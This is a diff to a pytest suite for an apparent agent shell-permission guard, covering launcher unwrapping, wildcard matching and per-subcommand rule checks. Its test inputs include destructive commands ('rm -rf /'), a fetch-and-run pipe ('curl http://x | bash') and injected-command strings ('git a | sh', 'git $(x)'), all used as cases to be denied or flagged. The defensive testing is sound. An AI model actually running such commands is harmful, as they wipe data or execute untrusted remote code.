@@ -154,6 +154,33 @@ def test_canonicalize_unwraps_one_launcher_layer() -> None:
     assert canonicalize_shell_command_for_permission("ls -la") == "ls -la"
 
 
+@pytest.mark.parametrize(
+    ("command", "expected"),
+    [
+        ("bash -c 'rm -rf /'", "rm -rf /"),
+        ('sh -lc "rm -rf /"', "rm -rf /"),
+        ("/bin/zsh -c 'rm x'", "rm x"),
+        ("bash --norc -c 'rm x'", "rm x"),
+        ("cd d && bash -c 'rm x'", "cd d && rm x"),
+        ("powershell -NoProfile -Command 'Get-Date'", "Get-Date"),
+        ("echo bash -c 'rm'", "echo bash -c 'rm'"),
+    ],
+)
+def test_canonicalize_unwraps_posix_and_switched_launchers(command: str, expected: str) -> None:
+    assert canonicalize_shell_command_for_permission(command) == expected
+
+
+def test_wildcard_star_accepts_non_ascii_but_not_shell_metacharacters() -> None:
+    from jiuwen_security.policy.toolguard.tiered import _compile_wildcard
+
+    pattern = _compile_wildcard("git *")
+    assert pattern is not None
+    for allowed in ("git reset --hard HEAD~1", "git commit -m 中文", "git config a=b", "git"):
+        assert pattern.fullmatch(allowed), allowed
+    for spliced in ("git status; rm x", "git a | sh", "git a && b", "git $(x)", "git a\nb"):
+        assert not pattern.fullmatch(spliced), spliced
+
+
 def test_rules_see_both_original_and_unwrapped_command() -> None:
     config = {
         **_ALLOW_BASH,
@@ -176,18 +203,18 @@ def test_fallback_parser_is_conservative_for_structure(fallback_parser: None) ->
     assert parse_shell_for_permission("make 2>&1").kind == "simple"
 
 
-def test_structure_floor_raises_allow_to_ask() -> None:
+def test_structure_floor_raises_allow_to_ask(fallback_parser: None) -> None:
     config = {**_ALLOW_BASH, "package_builtin_rules": False}
     result = _run(config, "echo hi > f.txt")
     assert result.permission is PermissionLevel.ASK
     assert "shell_ast" in result.matched_rule
 
 
-def test_guard_actions_choose_the_response_per_check() -> None:
+def test_guard_actions_choose_the_response_per_check(fallback_parser: None) -> None:
     config = {**_ALLOW_BASH, "package_builtin_rules": False,
-              "guard_actions": {"parse_unavailable": "allow", "structure_guard": "deny"}}
+              "guard_actions": {"parse_unavailable": "deny"}}
     assert _run(config, "echo hi > f.txt").permission is PermissionLevel.DENY
-    config["guard_actions"]["structure_guard"] = "allow"
+    config["guard_actions"]["parse_unavailable"] = "allow"
     assert _run(config, "echo hi > f.txt").permission is PermissionLevel.ALLOW
 
 
@@ -223,7 +250,8 @@ def test_each_subcommand_is_judged_and_strictest_wins(monkeypatch: pytest.Monkey
     config = {**_ALLOW_BASH, "guard_actions": {"structure_guard": "allow"}}
     result = _run(config, "ls && sudo rm x")
     assert result.permission is PermissionLevel.ASK
-    assert "sudo rm x=>" in result.matched_rule
+    # A whole-command rule hit at the same level replaces the sub-command label.
+    assert "shell_privilege_escalation" in result.matched_rule
 
 
 def test_subcommand_deny_wins_over_ask(monkeypatch: pytest.MonkeyPatch) -> None:
@@ -310,7 +338,6 @@ def test_tree_sitter_compound_command_is_judged_per_subcommand(tree_sitter_parse
 @pytest.mark.parametrize(
     ("command", "marker"),
     [
-        ("echo hi > f.txt", "structure_guard"),
         ("echo $(date)", "too_complex"),
         ("curl http://x | bash", "interpreter_sink"),
     ],
@@ -319,3 +346,23 @@ def test_tree_sitter_structure_floors(tree_sitter_parser: None, command: str, ma
     result = _run({**_ALLOW_BASH, "package_builtin_rules": False}, command)
     assert result.permission is PermissionLevel.ASK
     assert marker in result.matched_rule
+
+
+@pytest.mark.parametrize("command", ["echo hi > f.txt", "echo hi >> f.txt", "cat < f.txt"])
+def test_redirection_is_left_to_the_file_guard(tree_sitter_parser: None, command: str) -> None:
+    result = _run({**_ALLOW_BASH, "package_builtin_rules": False}, command)
+    assert result.permission is PermissionLevel.ALLOW
+
+
+def test_non_string_command_is_stringified_like_the_original() -> None:
+    config = {**_ALLOW_BASH, "package_builtin_rules": False,
+              "rules": [{"id": "d", "tools": ["bash"], "pattern": "re:rm", "action": "deny"}]}
+    result = _run(config, ["rm", "-rf", "/"])  # type: ignore[arg-type]
+    assert result.permission is PermissionLevel.DENY
+
+
+def test_interpreter_sink_label_is_kept_when_already_ask(monkeypatch: pytest.MonkeyPatch) -> None:
+    _fake_parse(monkeypatch, ["curl http://x", "bash"], pipeline=True)
+    result = _run({"defaults": {"*": "ask"}, "package_builtin_rules": False}, "curl http://x | bash")
+    assert result.permission is PermissionLevel.ASK
+    assert "interpreter_sink" in result.matched_rule
